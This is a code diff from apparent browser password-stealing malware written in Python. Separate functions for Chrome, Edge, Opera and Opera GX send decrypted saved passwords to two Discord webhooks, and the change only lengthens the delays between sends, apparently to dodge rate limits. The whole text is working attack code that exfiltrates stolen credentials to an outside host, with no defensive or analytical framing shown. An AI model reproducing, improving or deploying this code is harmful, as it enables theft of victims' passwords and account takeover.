@@ -157,16 +157,16 @@ def chromemain():
             webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Decrypted Password: {decrypted_password}")
             
             firstline1.execute()
-            time.sleep(0.5)
+            time.sleep(1)
             webhook1.execute()
             webhook2.execute()
-            time.sleep(0.5)
+            time.sleep(1)
             webhook3.execute()
             webhook4.execute()
-            time.sleep(0.5)
+            time.sleep(1)
             webhook5.execute()
             webhook6.execute()
-            time.sleep(0.5)
+            time.sleep(1)
 
 
 def edgemain():
@@ -201,16 +201,16 @@ def edgemain():
             webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Decrypted Password: {decrypted_password}")
             
             firstline1.execute()
-            time.sleep(0.5)
+            time.sleep(1)
             webhook1.execute()
             webhook2.execute()
-            time.sleep(0.5)
+            time.sleep(1)
             webhook3.execute()
             webhook4.execute()
-            time.sleep(0.5)
+            time.sleep(1)
             webhook5.execute()
             webhook6.execute()
-            time.sleep(0.5)
+            time.sleep(1)
 
 
 def operamain():
@@ -245,16 +245,16 @@ def operamain():
             webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Decrypted Password: {decrypted_password}")
             
             firstline1.execute()
-            time.sleep(0.5)
+            time.sleep(1)
             webhook1.execute()
             webhook2.execute()
-            time.sleep(0.5)
+            time.sleep(1)
             webhook3.execute()
             webhook4.execute()
-            time.sleep(0.5)
+            time.sleep(1)
             webhook5.execute()
             webhook6.execute()
-            time.sleep(0.5)
+            time.sleep(1)
 
 def operagxmain():
     key = operagx_key()
@@ -288,16 +288,16 @@ def operagxmain():
             webhook5, webhook6 = DiscordWebhook.create_batch(urls=[webhook_url, secondary_hook], content=f"Decrypted Password: {decrypted_password}")
             
             firstline1.execute()
-            time.sleep(0.5)
+            time.sleep(1)
             webhook1.execute()
             webhook2.execute()
-            time.sleep(0.5)
+            time.sleep(1)
             webhook3.execute()
             webhook4.execute()
-            time.sleep(0.5)
+            time.sleep(1)
             webhook5.execute()
             webhook6.execute()
-            time.sleep(0.5)
+            time.sleep(1)
 
 
             
